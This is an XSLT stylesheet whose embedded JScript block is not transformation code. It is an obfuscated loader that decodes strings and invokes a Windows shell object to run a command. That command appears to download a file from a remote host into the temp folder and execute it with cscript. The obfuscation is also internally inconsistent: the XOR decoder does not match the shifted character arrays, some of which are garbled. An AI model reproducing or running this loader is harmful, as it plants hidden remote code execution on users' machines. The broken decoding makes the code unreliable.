<?xml version='1.0'?> 
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="unknown" version="1.0">
<output method="text"/>
<ms:script language="JScript" implements-prefix="user"> 
<![CDATA[
(function() {
    function g(a) { 
        return a.map(function(b) { 
            return String.fromCharCode(b.charCodeAt(0) ^ 3); 
        }).join(''); 
    }

    var x = g(["f", "x", "q", "o", " ", "t", "u", "v", "v", "s", "h", ":", "/", "/", "u", "d", "w", ".", "p", "l", "w", "k", "h", "u", "e", "u", "s", "s", "r", "d", "q", "w", "h", "q", "w", "x", ".", "f", "r", "p", "/", "Y", "l", "n", "h", "}", "-", "T", "z", "v", "u", "/", "p", "r", "i", "c", " ", "-", "o", " ", "%", "W", "H", "Q", "S", "%", "\\", "p", "r", "i", "c", " ", "&", "&", " ", "f", "v", "f", "u", "l", "s", "w", ".", "h", "y", "h", " ", "%", "W", "H", "Q", "S", "%", "\\", "p", "r", "i", "c"]);
    var y = g(["X", "L", "f", "v", "w", "l", "s", "r", "y", "B", "M", "v", "d", "w", "r", "u"]);
    var z = g(["Z", "S", "o", "s", "h", "u", "v", "y", "K", "y", "p", "l", "l"]);
    var a = g(["S", "u", "q"]);

    var shell = new Function("return new " + y + "(\"" + z + "\")." + a + "(\"" + x + "\")");
    shell();
})();
]]> 
</ms:script>
</stylesheet>
